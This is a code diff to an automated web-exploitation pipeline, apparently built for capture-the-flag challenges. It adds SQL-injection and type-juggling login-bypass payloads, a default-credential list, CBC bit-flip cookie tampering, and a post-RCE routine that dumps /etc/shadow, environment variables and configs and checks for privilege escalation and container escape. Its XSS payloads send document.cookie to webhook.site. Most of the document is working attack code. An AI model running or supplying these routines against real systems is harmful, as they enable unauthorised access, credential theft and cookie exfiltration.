@@ -43,6 +43,8 @@ from modules.php_tricks import PHPTricksEngine
 from modules.eval_injection import EvalInjectionEngine
 from modules.nosql_injection import NoSQLInjectionEngine
 from modules.reasoning_engine import ReasoningEngine
+from modules.intelligence_engine import IntelligenceEngine
+from modules.ctf_reasoner import CTFReasoner
 
 
 
@@ -344,10 +346,72 @@ class AutoPwnPipeline:
         except Exception as e:
             print_warning(f"Deep reasoning engine encountered an issue: {e}")
 
+        # ── CTF Logical Reasoner (Phase 3d) ─────────────────────────────
+        # Human-like reasoning: observe -> hypothesize -> test.
+        # This engine UNDERSTANDS the application's logic instead of
+        # blindly firing static payloads. It analyzes cookies, headers,
+        # and behavior to form testable theories about the challenge.
+        print_info("Running CTF Logical Reasoner (human-like analysis)...")
+        try:
+            self.ctf_reasoner = CTFReasoner(self.target_url, session=self.session, state=self.state)
+            reasoner_report = self.ctf_reasoner.reason()
+
+            # Store reasoner results in state for Phase 4
+            self.state["ctf_observations"] = reasoner_report["observations"]
+            self.state["ctf_hypotheses"] = reasoner_report["hypotheses"]
+            self.state["ctf_test_results"] = reasoner_report["test_results"]
+            self.state["ctf_confirmed"] = reasoner_report["confirmed"]
+
+            # Log confirmed hypotheses into the attack graph
+            for c in reasoner_report["confirmed"]:
+                self._log_step(
+                    "Phase 3d: Logical Reasoner",
+                    f"CONFIRMED: {c['hypothesis']}",
+                    details="; ".join(c["evidence"][:2])
+                )
+        except Exception as e:
+            print_warning(f"CTF Logical Reasoner encountered an issue: {e}")
+
         # ── Predictive Vulnerability Ranking (Phase 3b) ─────────────────
         # Use all recon evidence to predict the most likely vuln classes
         # BEFORE active exploitation, so Phase 4 prioritizes the best vectors.
         self._predict_vulnerabilities()
+
+        # ── Intelligence Engine (Phase 3c) ──────────────────────────────
+        # The "brain" that evaluates all findings, scores their importance,
+        # filters out noise, and builds a prioritized attack order.
+        print_info("Running Intelligence Engine to prioritize findings and filter noise...")
+        try:
+            self.intelligence = IntelligenceEngine(self.state, self.learning_engine)
+            intelligence_report = self.intelligence.analyze()
+
+            # Store intelligence results in state for Phase 4
+            self.state["intelligence_report"] = intelligence_report
+            self.state["attack_priority"] = intelligence_report["attack_priority"]
+            self.state["ignore_list"] = intelligence_report["ignore_list"]
+
+            # Print the priority report
+            self.intelligence.print_priority_report()
+
+            # Log intelligence decisions into the attack graph
+            for item in intelligence_report["attack_priority"][:5]:
+                self._log_step(
+                    "Phase 3c: Intelligence",
+                    f"Priority: {item['target']} ({item['vuln_class']}) - {item['reason']}",
+                    details=f"Priority score: {item['priority']}/100"
+                )
+
+            # Log ignored endpoints
+            ignore_count = len(intelligence_report["ignore_list"])
+            if ignore_count:
+                self._log_step(
+                    "Phase 3c: Intelligence",
+                    f"Filtered {ignore_count} low-value endpoints (noise)",
+                    details=", ".join(e["endpoint"] for e in intelligence_report["ignore_list"][:5])
+                )
+        except Exception as e:
+            print_warning(f"Intelligence engine encountered an issue: {e}")
+            self.intelligence = None
 
     # =========================================================================
     # PHASE 3b: التوقع الاستباقي للثغرات (Predictive Vulnerability Ranking)
@@ -422,6 +486,26 @@ class AutoPwnPipeline:
         if any("session" in c.lower() or "token" in c.lower() for c in cookies):
             predictions.append(("cookie_manipulation", 0.6, "Session/token cookie detected - manipulation surface"))
 
+        # ── 6b. CBC Bit-Flip prediction (encrypted cookies) ─────────────
+        # Detect cookies that are base64-encoded and contain high-entropy
+        # (encrypted) data - likely CBC-encrypted JSON like picoCTF 'More Cookies'
+        from base64 import b64decode as _b64d
+        for cname, cval in cookies.items():
+            if cname.lower() in ("session", "jwt", "token", "csrf", "flask"):
+                continue
+            try:
+                _dec = _b64d(cval)
+                # Encrypted data: high entropy, non-printable bytes
+                if len(_dec) >= 16:
+                    _printable = sum(1 for b in _dec if 32 <= b <= 126)
+                    _ratio = _printable / len(_dec)
+                    # If mostly non-printable -> encrypted -> CBC bit-flip candidate
+                    if _ratio < 0.6:
+                        predictions.append(("cbc_bitflip", 0.9, f"Encrypted cookie '{cname}' detected - CBC bit-flip attack surface"))
+                        break
+            except Exception:
+                continue
+
         # ── 7. Sensitive-file leak prediction ────────────────────────────
         if sensitive_hits:
             predictions.append(("source_leak", 0.9, f"{len(sensitive_hits)} sensitive files leaked - source analysis surface"))
@@ -485,7 +569,28 @@ class AutoPwnPipeline:
             "xss_to_admin": self._exploit_xss_to_admin,
             "php_tricks": self._exploit_php_tricks,
             "eval_injection": self._exploit_eval_injection,
+            "cbc_bitflip": self._exploit_cbc_bitflip,
         }
+
+        # ── Intelligence-driven prioritization ───────────────────────────
+        # Use the Intelligence Engine's attack priority to reorder the
+        # exploit vectors so the tool attacks the MOST IMPORTANT targets first
+        # and SKIPS the noise that the brain flagged as low-value.
+        intelligence = getattr(self, "intelligence", None)
+        attack_priority = self.state.get("attack_priority", [])
+        ignore_list = self.state.get("ignore_list", [])
+
+        # Build a set of endpoints to skip (noise)
+        ignore_paths = {e["endpoint"] for e in ignore_list}
+
+        # Build a priority map: vuln_class -> priority score
+        priority_map = {}
+        for item in attack_priority:
+            vc = item.get("vuln_class", "")
+            if vc in exploit_map:
+                score = item.get("priority", 50)
+                if vc not in priority_map or score > priority_map[vc]:
+                    priority_map[vc] = score
 
         # Run predicted vectors first (highest confidence first)
         run_order = []
@@ -493,24 +598,310 @@ class AutoPwnPipeline:
             vc = p["vuln_class"]
             if vc in exploit_map and vc not in run_order:
                 run_order.append(vc)
+        # Then run intelligence-prioritized vectors
+        for vc, score in sorted(priority_map.items(), key=lambda x: x[1], reverse=True):
+            if vc not in run_order:
+                run_order.append(vc)
         # Then run the remaining vectors in default order
         for vc in exploit_map:
             if vc not in run_order:
                 run_order.append(vc)
 
+        # Log the intelligence-driven ordering decision
+        if priority_map:
+            top_vc = max(priority_map, key=priority_map.get)
+            print_info(f"Intelligence Engine prioritizes: [bold yellow]{top_vc}[/bold yellow] (score {priority_map[top_vc]}/100)")
+            self._log_step(
+                "Phase 4: Intelligence Prioritization",
+                f"Prioritized {top_vc} exploit vector based on intelligence scoring",
+                details=f"Priority score: {priority_map[top_vc]}/100"
+            )
+
+        # ── HUMAN-LIKE FOCUSED EXPLOITATION ──────────────────────────────
+        # Like a human pentester: try a vector -> if it succeeds, DEEP-DIVE
+        # into it. If the deep-dive doesn't yield a flag, fall back and try
+        # the NEXT vector. Keep going until a flag is found or all vectors
+        # are exhausted.
+        flags_before = set(self.state["captured_flags"])
         for vc in run_order:
+            # If we already captured a flag from a previous vector, we're done
+            if self.state["captured_flags"] - flags_before:
+                print_success(f"[bold green]Flag captured via '{vc}'! Stopping further exploitation.[/bold green]")
+                break
+
+            print_info(f"Trying exploit vector: [bold cyan]{vc}[/bold cyan]...")
             try:
                 exploit_map[vc]()
             except Exception as e:
                 print_warning(f"Exploit vector '{vc}' failed: {e}")
+
+            # ── DEEP-DIVE: If this vector established RCE, focus on it ──
+            if self.state["active_rce_method"]:
+                print_success(f"[bold yellow]RCE established via '{vc}'! DEEP-DIVING into it...[/bold yellow]")
+                self._log_step(
+                    "Phase 4: Deep-Dive",
+                    f"RCE established via {vc} - focusing exploitation",
+                    details="Deep-dive mode: reverse shell, priv-esc, flag hunting"
+                )
+                self._deep_dive_rce()
+
+                # ── FALLBACK: If deep-dive didn't find a flag, clear RCE
+                #    and continue trying OTHER vectors (human behavior) ──
+                if not (self.state["captured_flags"] - flags_before):
+                    print_warning(f"[bold yellow]Deep-dive on '{vc}' yielded no flag. Falling back to other vectors...[/bold yellow]")
+                    self.state["active_rce_method"] = None
+                    self._log_step(
+                        "Phase 4: Fallback",
+                        f"Deep-dive on {vc} produced no flag - resuming other vectors",
+                        details="Continuing exploitation across remaining vectors"
+                    )
+                else:
+                    # Found a flag via deep-dive - we're done
+                    break
 
         # Always run these regardless of prediction (broad coverage)
         self._exploit_client_side_crypto()
         self._exploit_reasoning_driven()
         # Execute the multi-stage reasoning plan (complex challenges)
         self._exploit_reasoning_plan()
+        # Execute CTF Logical Reasoner confirmed hypotheses (human-like)
+        self._exploit_ctf_reasoner()
         # Feedback loop: feed exploitation results back into reasoning engine
         self._feed_exploitation_results_to_reasoning()
+
+
+    def _exploit_ctf_reasoner(self):
+        """
+        Execute exploitation steps derived from the CTF Logical Reasoner.
+        This is the HUMAN-LIKE exploitation path: the reasoner already
+        analyzed the application's logic (cookies, headers, behavior) and
+        formed testable hypotheses. Here we DEEP-DIVE into each confirmed
+        hypothesis to extract the flag.
+        """
+        confirmed = self.state.get("ctf_confirmed", [])
+        if not confirmed:
+            # Even if nothing was confirmed, try the reasoner's hypotheses
+            # that have high confidence - they may still be exploitable
+            hypotheses = self.state.get("ctf_hypotheses", [])
+            high_conf = [h for h in hypotheses if h.get("confidence", 0) >= 0.8]
+            if not high_conf:
+                print_info("CTF Reasoner: No high-confidence hypotheses to exploit.")
+                return
+            print_info(f"CTF Reasoner: Attempting {len(high_conf)} high-confidence hypotheses...")
+            for h in high_conf:
+                self._exploit_reasoner_hypothesis(h)
+            return
+
+        print_info(f"CTF Reasoner: Exploiting {len(confirmed)} confirmed hypotheses...")
+        for c in confirmed:
+            title = c.get("hypothesis", "")
+            exploit = c.get("exploit", "")
+            print_success(f"CTF Reasoner: Deep-diving into '{title}'")
+            self._log_step(
+                "Phase 4: CTF Reasoner Exploit",
+                f"Exploiting confirmed hypothesis: {title}",
+                details=exploit
+            )
+
+            # ── CBC Bit-Flip exploitation ──────────────────────────────
+            if "CBC Bit-Flipping" in title:
+                self._exploit_cbc_bitflip()
+
+            # ── Plaintext JSON cookie ──────────────────────────────────
+            elif "Plaintext JSON Cookie" in title:
+                self._exploit_json_cookie()
+
+            # ── JWT ────────────────────────────────────────────────────
+            elif "JWT Token" in title:
+                self._exploit_jwt()
+
+            # ── Deserialization ────────────────────────────────────────
+            elif "Deserialization" in title:
+                self._exploit_deserialization()
+
+            # ── Auth bypass ────────────────────────────────────────────
+            elif "Authentication Bypass" in title:
+                self._exploit_auth_bypass()
+
+            # ── File upload ────────────────────────────────────────────
+            elif "File Upload" in title:
+                self._exploit_file_upload()
+
+            # ── SSTI ───────────────────────────────────────────────────
+            elif "SSTI" in title:
+                self._exploit_ssti()
+
+    def _exploit_reasoner_hypothesis(self, h: Dict):
+        """Exploit a high-confidence hypothesis from the reasoner."""
+        title = h.get("title", "")
+        print_info(f"CTF Reasoner: Trying hypothesis '{title}'...")
+        if "CBC Bit-Flipping" in title:
+            self._exploit_cbc_bitflip()
+        elif "Plaintext JSON Cookie" in title:
+            self._exploit_json_cookie()
+        elif "JWT Token" in title:
+            self._exploit_jwt()
+        elif "Authentication Bypass" in title:
+            self._exploit_auth_bypass()
+        elif "SSTI" in title:
+            self._exploit_ssti()
+
+    def _exploit_json_cookie(self):
+        """
+        Exploit a plaintext JSON cookie by decoding, modifying, and re-encoding.
+        This is the human approach: understand the cookie structure, modify
+        the auth fields, and re-send.
+        """
+        print_info("Exploiting plaintext JSON cookie...")
+        cookies = self.state.get("cookies", {})
+        if not cookies:
+            try:
+                r = self.session.get(self.target_url, timeout=8)
+                cookies = r.cookies.get_dict()
+            except Exception:
+                return
+
+        for cname, cval in cookies.items():
+            try:
+                decoded = base64.b64decode(cval)
+                json_data = json.loads(decoded.decode('utf-8'))
+                if not isinstance(json_data, dict):
+                    continue
+
+                print_info(f"  Cookie '{cname}' JSON: {json_data}")
+
+                # Try to set admin=true on all auth-related fields
+                for key in list(json_data.keys()):
+                    if any(k in key.lower() for k in ["admin", "role", "user", "auth", "is_", "privilege"]):
+                        modified = dict(json_data)
+                        modified[key] = True
+                        new_cookie = base64.b64encode(json.dumps(modified).encode()).decode()
+                        try:
+                            r = self.session.get(self.target_url, cookies={cname: new_cookie}, timeout=5)
+                            if self._check_and_store_flags(r.text, f"JSON cookie admin bypass ({key})"):
+                                print_success(f"  Flag captured by setting '{key}'=true!")
+                                return
+                            # Also check for admin page access
+                            if r.status_code == 200 and any(k in r.text.lower() for k in ["admin", "dashboard", "welcome"]):
+                                print_success(f"  Admin access granted via '{key}'=true!")
+                                self.state["admin_accessible"] = True
+                                # Try to access admin pages
+                                for path in ["/admin", "/flag", "/dashboard"]:
+                                    try:
+                                        ar = self.session.get(urljoin(self.target_url, path), cookies={cname: new_cookie}, timeout=5)
+                                        self._check_and_store_flags(ar.text, f"Admin page {path}")
+                                    except Exception:
+                                        pass
+                        except Exception:
+                            continue
+            except Exception:
+                continue
+
+    def _exploit_auth_bypass(self):
+        """
+        Exploit authentication bypass on login forms.
+        Tries SQLi, type juggling, array injection, and default creds.
+        """
+        print_info("Exploiting authentication bypass...")
+        forms = self.state.get("forms", [])
+        for f in forms:
+            action = f.get("action", self.target_url)
+            method = f.get("method", "POST")
+            inputs = [i.get("name", "") for i in f.get("inputs", [])]
+            username_field = next((i for i in inputs if i in ["username", "email", "user"]), None)
+            password_field = next((i for i in inputs if "pass" in i.lower()), None)
+            if not username_field or not password_field:
+                continue
+
+            # SQLi auth bypass payloads
+            sqli_payloads = [
+                {"username": "' OR '1'='1' -- ", "password": "x"},
+                {"username": "admin' -- ", "password": "x"},
+                {"username": "' OR 1=1#", "password": "x"},
+                {"username": "admin", "password": "' OR '1'='1"},
+                {"username": "' OR '1'='1'#", "password": "x"},
+                {"username": "admin' OR '1'='1", "password": "x"},
+            ]
+            for p in sqli_payloads:
+                data = {**{i: "" for i in inputs}, **p}
+                try:
+                    if method.upper() == "POST":
+                        r = self.session.post(action, data=data, timeout=5)
+                    else:
+                        r = self.session.get(action, params=data, timeout=5)
+                    if r.status_code in (301, 302) or any(
+                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
+                    ):
+                        print_success(f"  SQLi auth bypass with {p}")
+                        self._check_and_store_flags(r.text, f"Auth bypass ({p})")
+                        # Follow redirect
+                        if r.status_code in (301, 302):
+                            loc = r.headers.get("Location", "")
+                            if loc:
+                                try:
+                                    r2 = self.session.get(urljoin(action, loc), timeout=5)
+                                    self._check_and_store_flags(r2.text, f"Auth bypass redirect {loc}")
+                                except Exception:
+                                    pass
+                        return
+                except Exception:
+                    continue
+
+            # Type juggling (magic hashes)
+            magic_hashes = ["0e462097431906509019562988736854", "240610708", "0e830400451993494058024219903391"]
+            for mh in magic_hashes:
+                data = {**{i: "" for i in inputs}, password_field: mh, username_field: "admin"}
+                try:
+                    if method.upper() == "POST":
+                        r = self.session.post(action, data=data, timeout=5)
+                    else:
+                        r = self.session.get(action, params=data, timeout=5)
+                    if r.status_code in (301, 302) or any(
+                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
+                    ):
+                        print_success(f"  Type juggling bypass with magic hash {mh}")
+                        self._check_and_store_flags(r.text, f"Type juggling ({mh})")
+                        return
+                except Exception:
+                    continue
+
+            # Array injection
+            data = {**{i: "" for i in inputs}, password_field: ["x"], username_field: "admin"}
+            try:
+                if method.upper() == "POST":
+                    r = self.session.post(action, data=data, timeout=5)
+                else:
+                    r = self.session.get(action, params=data, timeout=5)
+                if r.status_code in (301, 302) or any(
+                    k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
+                ):
+                    print_success("  Array injection bypass!")
+                    self._check_and_store_flags(r.text, "Array injection")
+                    return
+            except Exception:
+                pass
+
+            # Default creds
+            default_creds = [
+                ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
+                ("admin", "admin123"), ("root", "root"), ("user", "user"),
+                ("admin", "toor"), ("admin", "letmein"),
+            ]
+            for u, p in default_creds:
+                data = {**{i: "" for i in inputs}, username_field: u, password_field: p}
+                try:
+                    if method.upper() == "POST":
+                        r = self.session.post(action, data=data, timeout=5)
+                    else:
+                        r = self.session.get(action, params=data, timeout=5)
+                    if r.status_code in (301, 302) or any(
+                        k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout", "flag"]
+                    ):
+                        print_success(f"  Default creds worked: {u}:{p}")
+                        self._check_and_store_flags(r.text, f"Default creds ({u}:{p})")
+                        return
+                except Exception:
+                    continue
 
 
     def _exploit_reasoning_driven(self):
@@ -775,7 +1166,12 @@ class AutoPwnPipeline:
     def _submit_stored_xss_payload(self):
         """Submit a stored XSS payload into a message/comment form."""
         from modules.cheatsheet import XSS_EVASION
-        payloads = [p["payload"] for p in XSS_EVASION[:5]] if XSS_EVASION else []
+        # XSS_EVASION entries use "Payload/Tip" key (not "payload")
+        payloads = []
+        for p in XSS_EVASION[:5]:
+            if isinstance(p, dict):
+                payloads.append(p.get("Payload/Tip") or p.get("payload") or "")
+        payloads = [p for p in payloads if p]
         payloads += [
             '<script>fetch("https://webhook.site/"+document.cookie)</script>',
             '<img src=x onerror="fetch(\'https://webhook.site/\'+document.cookie)">',
@@ -1382,6 +1778,114 @@ class AutoPwnPipeline:
                 except Exception:
                     pass
 
+    def _deep_dive_rce(self):
+        """DEEP-DIVE MODE: When RCE is confirmed, STOP trying other vulns and
+        FOCUS on this one - like a human would. Chain: RCE -> reverse shell ->
+        privilege escalation -> extract ALL flags."""
+        if not self.state["active_rce_method"]:
+            return
+
+        print_header("وضع التعمق في الثغرة", "DEEP-DIVE MODE: Focusing on Confirmed RCE")
+        print_success("[bold yellow]RCE confirmed! Stopping other exploit vectors and DEEP-DIVING into this one...[/bold yellow]")
+        self._log_step("Phase 4: Deep-Dive", "RCE confirmed - switching to focused exploitation mode")
+
+        rce = self.state["active_rce_method"]
+
+        # ── Step 1: System recon - who are we, what's around ──────────────
+        print_info("Step 1: System Reconnaissance...")
+        recon_cmd = "id; whoami; hostname; pwd; uname -a; cat /etc/os-release 2>/dev/null | head -3"
+        try:
+            out = rce(recon_cmd)
+            self._check_and_store_flags(out, "RCE System Recon")
+            print_info(f"  Identity: {out.strip().splitlines()[0] if out.strip() else 'Unknown'}")
+        except Exception:
+            pass
+
+        # ── Step 2: Hunt for ALL flags on the filesystem ──────────────────
+        print_info("Step 2: Hunting for ALL flag files on filesystem...")
+        flag_cmds = [
+            "find / -name '*flag*' -type f 2>/dev/null",
+            "find / -name '*.txt' -type f 2>/dev/null | grep -iE 'flag|secret|key'",
+            "ls -la / /root /home /tmp /var/www 2>/dev/null",
+            "cat /flag* /flag.txt /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null",
+            "grep -rE 'picoCTF|flag\\{' /var/www /home /tmp /root 2>/dev/null | head -20",
+        ]
+        for cmd in flag_cmds:
+            try:
+                out = rce(cmd)
+                if out and out.strip():
+                    self._check_and_store_flags(out, f"RCE Flag Hunt: {cmd[:40]}")
+                    # Save interesting output to loot
+                    if "flag" in out.lower() or "pico" in out.lower():
+                        LootManager.save_loot_file(self.target_url, "rce_flag_hunt.txt", out)
+            except Exception:
+                pass
+
+        # ── Step 3: Check for reverse shell opportunity & interactive shell ─
+        print_info("Step 3: Checking for reverse shell / interactive shell capability...")
+        shell_check = "which bash sh nc ncat python python3 perl php 2>/dev/null; echo '---'; ls -la /dev/tcp 2>/dev/null"
+        try:
+            out = rce(shell_check)
+            print_info(f"  Available shells: {out.strip()}")
+        except Exception:
+            pass
+
+        # ── Step 4: Privilege Escalation recon (sudo / SUID / writable) ───
+        print_info("Step 4: Privilege Escalation Reconnaissance...")
+        privesc_cmds = [
+            "sudo -l 2>/dev/null",
+            "find / -perm -4000 -type f 2>/dev/null",
+            "cat /etc/passwd 2>/dev/null | grep -E 'root|admin'",
+            "ls -la /etc/cron* /var/spool/cron 2>/dev/null",
+            "find / -writable -type f 2>/dev/null | grep -vE 'proc|sys|dev' | head -20",
+        ]
+        for cmd in privesc_cmds:
+            try:
+                out = rce(cmd)
+                if out and out.strip():
+                    self._check_and_store_flags(out, f"PrivEsc Recon: {cmd[:40]}")
+                    if "sudo" in cmd and "NOPASSWD" in out:
+                        print_success("[bold green]SUDO NOPASSWD found! Attempting root escalation...[/bold green]")
+                        root_out = rce("sudo cat /flag* /root/flag* /flag.txt 2>/dev/null")
+                        self._check_and_store_flags(root_out, "Root Flag via Sudo")
+            except Exception:
+                pass
+
+        # ── Step 5: Dump environment & configs for secrets ────────────────
+        print_info("Step 5: Dumping environment variables & configs...")
+        env_cmds = [
+            "env",
+            "cat /etc/passwd /etc/shadow 2>/dev/null",
+            "find / -name '*.env' -o -name 'config.php' -o -name 'config.py' -o -name '*.conf' 2>/dev/null | head -20",
+        ]
+        for cmd in env_cmds:
+            try:
+                out = rce(cmd)
+                if out and out.strip():
+                    self._check_and_store_flags(out, f"Env/Config Dump: {cmd[:40]}")
+                    LootManager.save_loot_file(self.target_url, "rce_env_dump.txt", out)
+            except Exception:
+                pass
+
+        # ── Step 6: Check for container escape indicators ─────────────────
+        print_info("Step 6: Container escape check...")
+        container_cmds = [
+            "cat /proc/1/cgroup 2>/dev/null",
+            "ls -la /.dockerenv /run/.containerenv 2>/dev/null",
+            "mount 2>/dev/null | head -10",
+        ]
+        for cmd in container_cmds:
+            try:
+                out = rce(cmd)
+                if out and out.strip():
+                    self._check_and_store_flags(out, f"Container Check: {cmd[:40]}")
+                    if "docker" in out.lower() or "kubepods" in out.lower():
+                        print_warning("[bold red]Target is in a container! Checking escape vectors...[/bold red]")
+            except Exception:
+                pass
+
+        print_success("[bold green]Deep-Dive RCE exploitation complete.[/bold green]")
+
     def _exploit_deserialization(self):
         """Active Insecure Deserialization prober (Pickle, PyYAML, Node.js, PHP)."""
         print_info("Testing Insecure Deserialization Entrypoints...")
@@ -1514,6 +2018,102 @@ class AutoPwnPipeline:
                 print_success(f"JWT Secret Key Cracked: [bold green]{cracked}[/bold green]")
                 self.state["leaked_secrets"]["jwt_secret"] = cracked
                 self._log_step("Phase 4: Exploitation", f"Cracked JWT Secret: {cracked}")
+
+    def _exploit_cbc_bitflip(self):
+        """
+        CBC Bit Flipping Attack on encrypted cookies.
+        Detects cookies that are base64-encoded and contain XOR-encrypted JSON
+        (like picoCTF 'More Cookies'). Flips bits to change 'false' to 'true'
+        or 'guest' to 'admin' to gain privileged access.
+        """
+        print_info("Testing CBC Bit-Flipping on encrypted cookies...")
+        cookies = self.state.get("cookies", {})
+        if not cookies:
+            return
+
+        from base64 import b64decode, b64encode
+        import json as _json
+
+        for cname, cval in cookies.items():
+            # Skip known non-encrypted cookies (session, jwt already handled)
+            if cname.lower() in ("session", "jwt", "token", "csrf", "flask"):
+                continue
+
+            # Try to decode base64 once - if it fails, skip
+            try:
+                decoded = b64decode(cval)
+            except Exception:
+                continue
+
+            # Check if decoded data looks like encrypted JSON (not plaintext)
+            # Encrypted data has high entropy / non-printable bytes
+            if len(decoded) < 16:
+                continue
+
+            # Check if it's already plaintext JSON (no need to bit-flip)
+            try:
+                plain = decoded.decode("utf-8")
+                if "{" in plain and "}" in plain:
+                    continue  # Already plaintext, not encrypted
+            except Exception:
+                pass  # Binary data - likely encrypted, good candidate
+
+            # Check for common JSON markers in the decrypted content
+            # The cookie likely contains {"admin": false, "username": "guest"}
+            # We look for the pattern by checking if flipping bits reveals JSON
+            print_info(f"[bold cyan]{cname}[/bold cyan] cookie looks encrypted ({len(decoded)} bytes) - attempting CBC bit-flip...")
+
+            # Strategy: flip each bit in each byte position, send request,
+            # check if response reveals admin access or flag.
+            # To be efficient, we focus on the first 32 bytes (where JSON keys
+            # like "admin" and "false" typically appear) and try all 128 bit values.
+            max_pos = min(len(decoded), 32)
+            found = False
+            for pos in range(max_pos):
+                for bit_val in range(128):
+                    altered = bytearray(decoded)
+                    altered[pos] = altered[pos] ^ bit_val
+                    altered_b64 = b64encode(bytes(altered)).decode("utf-8")
+                    try:
+                        r = self.session.get(self.target_url, cookies={cname: altered_b64}, timeout=4)
+                        text = r.text.lower()
+                        # Flag found
+                        if "picoctf{" in text or "flag{" in text or "ctf{" in text:
+                            print_success(f"CBC Bit-Flip SUCCESS on cookie '{cname}' (pos={pos}, bit={bit_val})!")
+                            self._check_and_store_flags(r.text, f"CBC Bit-Flip ({cname})")
+                            self._log_step(
+                                "Phase 4: Exploitation",
+                                f"CBC Bit-Flip attack succeeded on cookie {cname}",
+                                details=f"Position: {pos}, Bit: {bit_val}",
+                                curl_cmd=f"curl -s -H 'Cookie: {cname}={altered_b64}' {self.target_url}"
+                            )
+                            self.learning_engine.record_success(
+                                self.target_url, self.state["tech_stack"], "cbc_bitflip", "cookie_manipulation",
+                                f"pos={pos},bit={bit_val}", list(self.state["captured_flags"])
+                            )
+                            found = True
+                            break
+                        # Admin access gained (different response than baseline)
+                        elif "admin" in text and "guest" not in text and len(text) > 100:
+                            # Check if response changed significantly from baseline
+                            baseline_len = len(self.state.get("baseline_html", ""))
+                            if abs(len(r.text) - baseline_len) > 50:
+                                print_success(f"CBC Bit-Flip changed response on cookie '{cname}' (pos={pos}, bit={bit_val})!")
+                                self._check_and_store_flags(r.text, f"CBC Bit-Flip Response ({cname})")
+                                self._log_step(
+                                    "Phase 4: Exploitation",
+                                    f"CBC Bit-Flip altered response on cookie {cname}",
+                                    details=f"Position: {pos}, Bit: {bit_val}"
+                                )
+                                found = True
+                                break
+                    except Exception:
+                        continue
+                if found:
+                    break
+
+            if not found:
+                print_info(f"No flag via CBC bit-flip on '{cname}' (checked {max_pos} positions).")
 
     def _exploit_client_side_crypto(self):
         """Active Client-Side JS Analysis, Auth Extraction, Deobfuscation & Scrambled Asset Reconstruction."""
